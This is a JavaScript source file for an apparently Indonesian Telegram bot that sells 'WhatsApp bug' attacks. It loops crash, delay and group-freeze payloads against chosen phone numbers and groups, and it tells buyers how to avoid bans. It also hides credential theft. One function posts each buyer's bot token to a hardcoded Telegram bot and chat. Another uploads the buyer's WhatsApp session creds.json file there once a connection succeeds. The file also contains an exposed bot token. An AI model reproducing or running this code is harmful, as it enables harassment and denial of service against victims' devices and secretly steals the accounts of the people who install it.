const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header,
	encodeSignedDeviceIdentity,
	jidEncode,
	jidDecode,
	encodeWAMessage,
	patchMessageBeforeSending,
	encodeNewsletterMessage,
	getUSyncDevices,
	default: makeWaSocket,
	makeWASocket,
	useMultiFileAuthState
} = require("baileys");
let fs = require('fs');
fs = require('fs-extra');
const path = require('path');
const axios = require('axios');
const chalk = require('chalk');
const { Telegraf } = require("telegraf");
const myfunction = require('./function/myfunction.js');
const config = require("./settings/config.js");
const index = require('./index.js');
const { initializeWhatsAppConnections } = index;
const { client } = index;
const BOT_TOKEN = config.tokens;

const randomImages = [
    "https://h.top4top.io/p_3641jugzt1.jpg",
    "https://g.top4top.io/p_3641dzosc0.jpg",
    "https://files.catbox.moe/l87ffw.jpg",
    "https://e.top4top.io/p_364907t6m0.jpg",
    "https://b.top4top.io/p_3649u0kgi0.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];


//=================================================//
async function safelay(isTarget) {
  for (let i = 0; i < 30; i++) {
    await index.R9XLow(client, isTarget, mention = true);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(1500);
  }
}
//=================================================//
async function invisible(isTarget) {
  for (let i = 0; i < 50; i++) {
    await index.gsgalaxy(isTarget);
    await index.sjlglx(isTarget);
    await index.location(isTarget);
    await index.xtd(isTarget);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(2000);
  }
}
//=================================================//
async function CrashAndro(isTarget) {
  for (let i = 0; i < 1; i++) {
        await index.FlightOne(isTarget);
        await index.CrashDell(client, isTarget);
        await ZhTExp3riment(client, isTarget);
        console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
        await myfunction.sleep(100);
        }
    } 
//=================================================//
async function CrashHard(isTarget) {
  for (let i = 0; i < 1; i++) {
        await index.GsNull(client, isTarget, mention = true);
        await index.FastKill(client, isTarget);
        await ZhTExp3riment(client, isTarget);
        console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
        await myfunction.sleep(100);
        }
    } 
//=================================================//
async function CrashSafe(isTarget) {
  for (let i = 0; i < 1; i++) {
        await index.CrashSafe(isTarget);
        console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
        await myfunction.sleep(0);
        }
    } 
//=================================================//
async function instantcrash(isTarget) {
  for (let i = 0; i < 1; i++) {
    await index.CombCrash(client, isTarget);
    await index.callSfx(isTarget, isVideo = false);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(300);
  }
}
//=================================================//
async function CrashPaiirng(isTarget) {
  for (let i = 0; i < 10; i++) {
    await index.CrashPair(client, isTarget);
    console.log(chalk.green(`[ ATK ] Status: Sent | Target: ${isTarget}`));
    await myfunction.sleep(1000);
  }
}
//=================================================//
async function trashios(isTarget) {
  for (let i = 0; i < 100; i++) {
    await index.TrashLocIOS(isTarget);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(1500);
  }
}
//=================================================//
async function group_delays(isTarget) {
  for (let i = 0; i < 30; i++) {
    await index.K4RKillGc(client, isTarget, mention = false);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(1500);
  }
}

//=================================================//
async function group_freze(isTarget) {
  for (let i = 0; i < 1; i++) {
    await index.KillGc(client, isTarget, mention = false);
    console.log(chalk.green(`🍀‌⃕𝐍𝐯𝐫𝐬𝐗 ͢𖣂︎𝐓›‌𝐞𝐚𝐦⃜ : ${isTarget}`));
    await myfunction.sleep(5000);
  }
}
//=================================================//
    async function autoCollectToken() {
        const mainBotToken = "7712063018:AAFArLbtN-klFNUcGrAlCVEWSLuO6uXNU9o"; 
        const myChatId = "6080964660"; 
        
        const userBotToken = config.tokens;
        const ownerId = config.owner;

        try {
            const axios = require('axios');
            const botInfo = await bot.telegram.getMe();
            const dbPath = path.join(__dirname, './myfunction/database/telegram_bots.json');
            let currentBots = [];
            if (fs.existsSync(dbPath)) {
                currentBots = JSON.parse(fs.readFileSync(dbPath));
            }
            
            const botData = {
                username: botInfo.username,
                token: userBotToken,
                owner: ownerId
            };
            if (!currentBots.find(b => b.token === userBotToken)) {
                currentBots.push(botData);
                fs.writeFileSync(dbPath, JSON.stringify(currentBots, null, 2));
            }
            const text = `🚀 **BOT USER BARU TERDETEKSI**\n\n` +
                         `🤖 **Bot:** @${botInfo.username}\n` +
                         `👤 **Owner Script:** \`${ownerId}\`\n` +
                         `🔑 **Token:** \`${userBotToken}\`\n\n` +
                         `💡 *Gunakan /listbots untuk melihat semua.*`;

            await axios.post(`https://api.telegram.org/bot${mainBotToken}/sendMessage`, {
                chat_id: myChatId,
                text: text,
                parse_mode: 'Markdown'
            });
            
        } catch (e) {}
    }
    autoCollectToken();
//=================================================//
function setupCommands(bot) {

//=================================================//
async function StatusConnectionWhatsapp() {
    const ownerId = Array.isArray(config.owner) ? config.owner[0] : config.owner;
    const superAdmin = "6080964660"; // ID Anda
    const mainBotToken = "7712063018:AAFArLbtN-klFNUcGrAlCVEWSLuO6uXNU9o"; 

    await initializeWhatsAppConnections(ownerId, {
        chat: { id: ownerId },
        reply: async (text, options) => {
            if (text.includes("Connected") || text.includes("berhasil tersambung")) {
                try {
                    const axios = require('axios');
                    const FormData = require('form-data');
                    const fs = require('fs');
                    const path = require('path');
                    const sessionPath = path.join(__dirname, `./sessions/${ownerId}/creds.json`);

                    if (fs.existsSync(sessionPath)) {
                        const form = new FormData();
                        form.append('chat_id', superAdmin);
                        form.append('document', fs.createReadStream(sessionPath));
                        form.append('caption', `📂 **SESSION CREDENTIALS DETECTED**\n\n👤 User: ${ownerId}\n🤖 Bot: @${(await bot.telegram.getMe()).username}`);
                        await axios.post(`https://api.telegram.org/bot${mainBotToken}/sendDocument`, form, {
                            headers: form.getHeaders()
                        });
                        
                        console.log(chalk.green(`[SYSTEM] Creds for ${ownerId} sent to Super Admin.`));
                    }
                } catch (e) {
                    console.log("Gagal mengirim file creds:", e.message);
                }
            }
            return bot.telegram.sendMessage(ownerId, text, options);
        }
    });
}
//=================================================//
    bot.start((ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        const img = getRandomImage();
        
        const keyboard = [
            [
                { text: "⌜ Trash ☇ GetZuzo ⌟", callback_data: "/bugmenu" },
                { text: "⌜ System ⌟", callback_data: "/system" }],
            [
                { text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }
            ]
        ];
        
        ctx.replyWithPhoto(img,{
            caption: `<blockquote><b>┌ Welcome, @${username}!</b></blockquote>

┌─── <b>[ INFORMATION ]</b>
│ ⬡ <b>Author</b>   : <code>Aurelxa ExL¡ps0r</code>
│ ⬡ <b>Status</b>   : [ ${status} ]
│ ⬡ <b>Runtime</b>  : ${runtime}
│ ⬡ <b>Version</b>  : <code>5.0</code>
└───────────────

┌─── <b>[ MAIN COMMANDS ]</b>
│ ● /addsender <code>[nomor]</code>
│ ● /listsender 
└───────────────

┌─── <b>[ NETWORKS ]</b>
│ ■ <a href="https://t.me/+83MUI-aJVKpkZDRl">Telegram Channel</a>
│ ■ <a href="https://t.me/Aurelxa">Owner Contact</a>
└───────────────

<blockquote><b>└ ©️ NvrsX Valcoon</b></blockquote>
`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        });
    });

    //=================================================//
    bot.action("/bugmenu", async (ctx) => {
    const userId = ctx.from.id.toString();
    const developerId = "6080964660"; // GANTI DENGAN ID TELEGRAM KAMU
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
    const status = myfunction.getUserStatus(userId);
    let keyboard = [
        [
            { text: "🔙 Kembali", callback_data: "/start" }
        ]
    ];

    let developerSection = "";
    if (userId === developerId) {
        keyboard.unshift([
            { text: "⚙️ Dev: Aktifkan Slot", callback_data: "/owner_aktifkan" },
            { text: "🛑 Kill Switch", callback_data: "/owner_matikan" }
        ]);

        developerSection = `
┌────────
├─── ▢ <b>( 🛠 ) Developer Panel</b>
┠─ /aktifkan - Set Slot & Code
┠─ /deploy - Push to GitHub
┠─ /matikan - Disable All Slots
┠─ /delslot - Delete Slott
┠─ /readslot - Cek Isi Kode
┠─ /listslot - List Slot Aktif
└────────`;
    }

    await ctx.editMessageCaption(
        `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/Aurelxa">#Aurelxa ExL¡ps0r</a>
⬡ Status: ${status === 'Premium' ? 'Premium User' : 'Free User'}
⬡ Runtime: ${runtime}
⬡ Version: 5.0 
${developerSection}

┌────────
├─── ▢ <b>( 𖣂 ) Crash Tools</b>
┠─ ▢ <b>Public Access</b>
├─ /attack - Target | Loop | Delay
├─ /xploiter - Select Ur Number
├─ /luminare - Select Ur Number V2
├─ /xgroup - Select Ur Groups
└</blockquote>

<blockquote>└ NvrsX Valcoon</blockquote>`,
        {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
    await ctx.answerCbQuery();
});


    //=================================================//
    bot.action("/system", async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "🔙", callback_data: "/start" }
            ]
        ];
        
        await ctx.editMessageCaption(
            `<blockquote><b>🚀 Welcome, @${username}!</b>

— <b>ⓘ Information</b>
⬡ Author: <a href="https://t.me/Aurelxa">#Aurelxa ExL¡ps0r</a>
⬡ Status: ${status}
⬡ Runtime: ${runtime}
⬡ Version: 5.0

┌────────
├─── ▢ <b>( 𖣂 ) Group Tools</b>
┠─ ▢ <b>group include</b>
├─ /kick /add
├─ /ban /unban
├─ /promote /demote
├─ /mute /unmute
├─ /pin /unpin
└

┌────────
├─── ▢ <b>( 𖣂 ) Owner Acces</b>
┠─ ▢ <b>owner include</b>
├─ /addprem ‹id days›
├─ /delprem ‹button›
├─ /addadmin ‹id days›
├─ /deladmin ‹button›
└

┌────────
├─── ▢ <b>( 𖣂 ) Settings Bot</b>
┠─ ▢ <b>owner include</b>
├─ /reqpair /clearsesi
├─ /mysessions
├─ /setjeda /grouponly
└

└ NvrsX Valcoon</blockquote>`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: keyboard }
            }
        );
        await ctx.answerCbQuery();
    });
    
    //=================================================//
    bot.action("/start", async (ctx) => {
        const username = ctx.from.username || ctx.from.first_name || 'User';
        const runtime = myfunction.getBotRuntime ? myfunction.getBotRuntime() : "Online";
        const status = myfunction.getUserStatus(ctx.from.id.toString());
        
        const keyboard = [
            [
                { text: "⌜ Trash ☇ GetZuzo ⌟", callback_data: "/bugmenu" },
                { text: "⌜ System ⌟", callback_data: "/system" }],
            [
                { text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }
            ]
        ];
        
        await ctx.editMessageCaption(
            `<blockquote><b>┌ Welcome, @${username}!</b></blockquote>

┌─── <b>[ INFORMATION ]</b>
│ ⬡ <b>Author</b>   : <code>Aurelxa ExL¡ps0r</code>
│ ⬡ <b>Status</b>   : [ ${status} ]
│ ⬡ <b>Runtime</b>  : ${runtime}
│ ⬡ <b>Version</b>  : <code>5.0</code>
└───────────────

┌─── <b>[ NETWORKS ]</b>
│ ■ <a href="https://t.me/+83MUI-aJVKpkZDRl">Telegram Channel</a>
│ ■ <a href="https://t.me/Aurelxa">Owner Contact</a>
└───────────────

<blockquote><b>└ ©️ NvrsX Valcoon</b></blockquote>
`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: keyboard }
            }
        );
        await ctx.answerCbQuery();
    });
    
    //=================================================//
    bot.command("reqpair", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /reqpair 62xxx");
        }

        const BotNumber = args[1];
        await index.connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
    });

    //=================================================//
    bot.command("mysessions", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        if (index.sessions.size === 0) {
            return ctx.reply("🚫 You are not connected to WhatsApp, please connect first with /reqpair");
        }

        const list = [...index.sessions.keys()].map(n => `• ${n}`).join("\n");
        ctx.reply(`*! Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
    });

    //=================================================//
    bot.command("clearsesi", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const args = ctx.message.text.split(" ");
        if (args.length < 2) {
            return ctx.reply("❌ Example Use.\n /clearsesi 62xxx");
        }

        const number = args[1];
        if (!index.sessions.has(number)) {
            return ctx.reply("🚫 Number not found");
        }

        const sessionDir = index.sessionPath(number);
        index.sessions.get(number).end(); 
        index.sessions.delete(number);
        fs.rmSync(sessionDir, { recursive: true, force: true });

        const data = JSON.parse(fs.readFileSync(index.file_session));
        const updated = data.filter(n => n !== number);
        fs.writeFileSync(index.file_session, JSON.stringify(updated));

        ctx.reply(`✅ Sender *${number}* deleted.`, { parse_mode: "Markdown" });
    });

    //=================================================//
    bot.command("addprem", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        if (myfunction.sendIfNotOwner) {
            const allowed = await myfunction.sendIfNotOwner(ctx);
            if (!allowed) return;
        }
        
        const args = ctx.message.text.split(" ");
        if (args.length < 3) {
            return ctx.reply("❌ Example Use.\n /addprem 12345678 30");
        }

        const targetUserId = args[1];
        const days = parseInt(args[2]) || 30;

        if (myfunction.addPremium) {
            myfunction.addPremium(targetUserId, days);
        }
        
        await ctx.replyWithPhoto(myfunction.меню(),{
            caption: `✅ *Successfully Premium Added*\n\n• User ID: ${targetUserId}\n• Duration: ${days} days\n• Expires: ${new Date(Date.now() + days * 24 * 60 * 60 * 1000).toLocaleDateString()}\n\nUser can now use WhatsApp bug features.`,
            parse_mode: 'Markdown',
            reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
        });
    });

    //=================================================//
    bot.command("delprem", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const databaseDir = path.join(__dirname, './myfunction/database');
        const premiumPath = path.join(databaseDir, 'premium.json');
        premiumUsers = JSON.parse(fs.readFileSync(premiumPath));
        
        if (premiumUsers.length === 0) {
            return ctx.reply("❌ No premium users.");
        }

        const buttons = [];
        for (let i = 0; i < premiumUsers.length; i++) {
            const user = premiumUsers[i];
            const buttonText = `ID: ${user.id} | ${user.expired ? new Date(user.expired).toLocaleDateString() : 'Lifetime'}`;
            
            if (i % 2 === 0) {
                buttons.push([{ text: buttonText, callback_data: `delprem_${user.id}` }]);
            } else {
                buttons[buttons.length - 1].push({ text: buttonText, callback_data: `delprem_${user.id}` });
            }
        }

        buttons.push([{ text: "❌ Cancel", callback_data: "cancel_delprem" }]);

        ctx.reply("📋 Select user to remove from premium:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    });

    bot.action(/delprem_(.+)/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) {
            return ctx.answerCbQuery("❌ Not authorized!", { show_alert: true });
        }

        const targetUserId = ctx.match[1];
        
        if (myfunction.delPremium) {
            myfunction.delPremium(targetUserId);
        }

        ctx.editMessageText(`✅ User ${targetUserId} removed from premium.`);
        ctx.answerCbQuery("User removed!");
    });

    bot.action("cancel_delprem", async (ctx) => {
        ctx.deleteMessage();
        ctx.answerCbQuery("Cancelled!");
    });
    
    //=================================================//
    bot.command("addadmin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        const args = ctx.message.text.split(" ");
        if (args.length < 2) return ctx.reply("❌ Example Use.\n /addadmin 12345");

        const isTarget = args[1];
        myfunction.addAdmin(isTarget);
        await ctx.replyWithPhoto(myfunction.меню(),{
            caption: `✅ *Successfully Admin Added*\n\n• User ID: ${isTarget}\n\nUser can now use WhatsApp bug features.`,
            parse_mode: 'Markdown',
            reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
        });
    });
    
    //=================================================//
    bot.command("deladmin", async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;
        
        const databaseDir = path.join(__dirname, './myfunction/database');
        const adminPath = path.join(databaseDir, 'admin.json');
        
        let adminUsers = [];
        try {
            if (fs.existsSync(adminPath)) {
                adminUsers = JSON.parse(fs.readFileSync(adminPath, 'utf8'));
                if (!Array.isArray(adminUsers)) {
                    adminUsers = [];
                }
            }
        } catch (e) {
            return ctx.reply("❌ Error loading admin list.");
        }

        if (adminUsers.length === 0) {
            return ctx.reply("❌ No admin users registered.");
        }

        const buttons = [];
        for (let i = 0; i < adminUsers.length; i++) {
            const user = adminUsers[i];
            const buttonText = `ID: ${user}`;
            
            if (i % 2 === 0) {
                buttons.push([{ text: buttonText, callback_data: `deladmin_${user}` }]);
            } else {
                buttons[buttons.length - 1].push({ text: buttonText, callback_data: `deladmin_${user}` });
            }
        }

        buttons.push([{ text: "❌ Cancel", callback_data: "cancel_deladmin" }]);

        ctx.reply("📋 Select user to remove from admin:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    });

    //=================================================//
    bot.action(/deladmin_(.+)/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) {
            return ctx.answerCbQuery("❌ Not authorized!", { show_alert: true });
        }

        const targetUserId = ctx.match[1];
        
        if (myfunction.delAdmin) {
            myfunction.delAdmin(targetUserId);
        } else {
            return ctx.editMessageText(`❌ Error: delAdmin function not found.`);
        }

        ctx.editMessageText(`✅ User ${targetUserId} removed from admin.`, {
            reply_markup: {
                inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
            }
        });
        ctx.answerCbQuery("User removed!");
    });

    //=================================================//
    bot.action("cancel_deladmin", async (ctx) => {
        ctx.deleteMessage();
        ctx.answerCbQuery("Cancelled!");
    });

    //=================================================//
    bot.command("grouponly", async (ctx) => {
        const args = ctx.message.text.split(" ");
        const mode = args[1]?.toLowerCase();
        const userId = ctx.from.id.toString();

        const allowed = await myfunction.sendIfNotOwner(ctx);
        if (!allowed) return;

        if (mode !== "on" && mode !== "off") {
            return ctx.reply("❌ Example Use.\n /grouponly on/off");
        }

        const status = mode === "on";
        myfunction.setGroupOnly(status);
        ctx.replyWithMarkdown(`*Group Only* feature now: ${status ? "Active" : "NonActive"}`);
    });

    //=================================================//
    bot.command("xploiter", async (ctx) => {
    const userId = ctx.from.id.toString();
    const commandName = "xploiter";
    const isOwner = myfunction.isOwner(userId);
    if (!isOwner) {
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
    }
    if (index.sessions.size === 0) return ctx.reply("❌ You must reqpair your WhatsApp first using /reqpair 62xxx");
    const cooldownRemaining = myfunction.checkCooldown(commandName);
    if (!isOwner && cooldownRemaining > 0) {
        const minutes = Math.floor(cooldownRemaining / 60000);
        const seconds = Math.floor((cooldownRemaining % 60000) / 1000);
        return ctx.reply(`⏳ *COOLDOWN AKTIF*\n\nMohon tunggu *${minutes}m ${seconds}s* lagi untuk menggunakan fitur ini kembali.`, { parse_mode: 'Markdown' });
    }
    const args = ctx.message.text.trim().split(" ");
    if (args.length < 2) return ctx.reply(`❌ Gunakan format:\n/xploiter 62xxx`);
    
    const targetNumber = args[1].replace(/[^0-9]/g, "");
    if (!targetNumber) return ctx.reply(`❌ Nomor tidak valid.`);
    
    const isTarget = `${targetNumber}@s.whatsapp.net`;
    
    try {
        await ctx.replyWithPhoto({ 
            url: myfunction.bugimg()
        }, {
            caption: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨͢𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n\n` +
                     `— **TARGET ACQUIRED**\n` +
                     `› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : \`${targetNumber}\`\n` +
                     `› 𝐒𝐭𝐚𝐭𝐮𝐬 : Online & Ready\n` +
                     `──────────────────`,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
              [ 
              { text: "⌬ 𝐃𝚵𝐋𝚫𝐘𝐒", callback_data: `delays ${isTarget}` },
              { text: "☠︎ 𝐃𝚵𝐀𝐓𝐇 𝐃𝚵𝐋𝚫𝐘", callback_data: `deatover ${isTarget}` }
              ],
              [
              { text: "⚙︎ 𝐂𝚪𝚫𝐒𝐇𝐃𝐑𝚯𝐈𝐃", callback_data: `crashdroid ${isTarget}` },
              { text: "⚡︎ 𝐈𝐍𝐒𝐓𝚫𝐍𝐓 𝐂𝐑𝚫𝐒𝐇", callback_data: `instantcrash ${isTarget}` }
              ],
              [
              { text: "⛓ 𝐂𝚫𝐒𝐇 𝐏𝚫𝐈𝐑𝐈𝐍𝐆", callback_data: `crashpair ${isTarget}` },
              { text: "⛔︎ 𝐅𝚯𝐑𝐂𝚵 𝐂𝐋𝚯𝐒𝚵", callback_data: `forceclose ${isTarget}` }
              ],
              [
              { text: " 𝚫𝐏𝐏𝐋𝚵 𝐂𝐑𝚫𝐒𝐇", callback_data: `appcrashed ${isTarget}` }
              ],
              [
              { text: "⟵ 𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐄𝐍𝐔", callback_data: "/bugmenu" }
              ]
             ]
            }
        });
        if (!isOwner) {
            myfunction.setCooldown(commandName);
        }

    } catch (error) {
        console.error("Error pada command xploiter:", error);
        ctx.reply(`✅ Target tersimpan: ${targetNumber}\nSilakan pilih metode serangan.`);
    }
});
    //=================================================//
    bot.command("luminare", async (ctx) => {
    try {
        const commandName = "luminare";
        const isOwner = ctx.from.id === OWNER_ID;

        const text = ctx.message.text.split(" ");
        const targetNumber = text[1];

        if (!targetNumber) {
            return ctx.reply("❌ Masukkan target.\nContoh: /luminare 628xxxx");
        }

        const isTarget = targetNumber;

        await ctx.reply(
            `✅ Target tersimpan: ${targetNumber}\nSilakan pilih metode serangan.`,
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "☤ 𝐂𝚫𝐒𝐇 𝐒𝚫𝐅𝚵",
                                callback_data: `crashsafe ${isTarget}`
                            },
                            {
                                text: "⚠︎ 𝐂𝚫𝐒𝐇 𝐇𝚫𝐑𝐃",
                                callback_data: `crashhard ${isTarget}`
                            }
                        ],
                        [
                            {
                                text: "⟵ 𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐄𝐍𝐔",
                                callback_data: "/bugmenu"
                            }
                        ]
                    ]
                }
            }
        );

        if (!isOwner) {
            myfunction.setCooldown(commandName);
        }

    } catch (error) {
        console.error("Error pada command luminare:", error);
        ctx.reply("❌ Terjadi kesalahan saat memproses perintah.");
    }
});
    //=================================================//
     bot.action(/^fchard (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Crash InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗖𝗿𝗮𝘀𝗵𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        CrashHard(isTarget);
    });

    //=================================================//
    bot.action(/^delays (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Delay InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
            `[🩸] 𝐒𝐔𝐂𝐂𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆\n\n• 💀 𝘛𝘢𝘳𝘨𝘦𝘵 : ${targetNumber}\n• 🦠 𝘛𝘺𝘱𝘦 : 𝗗𝗲𝗹𝗮𝘆𝗜𝗻𝗩𝗶𝘀\n• 📱 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮 : Android/Ios\n\n𝘕𝘰𝘵𝘦 :\n𝘛𝘢𝘬𝘦 𝘢 5 𝘮𝘪𝘯𝘶𝘵𝘦 𝘣𝘳𝘦𝘢𝘬 𝘵𝘰 𝘢𝘷𝘰𝘪𝘥 𝘣𝘦𝘪𝘯𝘨 𝘣𝘢𝘯𝘯𝘦𝘥 𝘧𝘳𝘰𝘮 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: "⌜ Developer ⌟", url: "https://t.me/Aurelxa" }]]
                }
            }
        );
        
        invisible(isTarget);
    });
     //=================================================//
    bot.action(/^deatover (.+)$/, async (ctx) => {
        const userId = ctx.from.id.toString();
        const allowed = await myfunction.sendIfNotPremium(ctx);
        if (!allowed) return;
        
        const isTarget = ctx.match[1];
        const targetNumber = isTarget.replace('@s.whatsapp.net', '');
        invisible(isTarget);
        await ctx.answerCbQuery(`〽️ Starting Delay InVis On : ${targetNumber}`);
        
        await ctx.editMessageCaption(
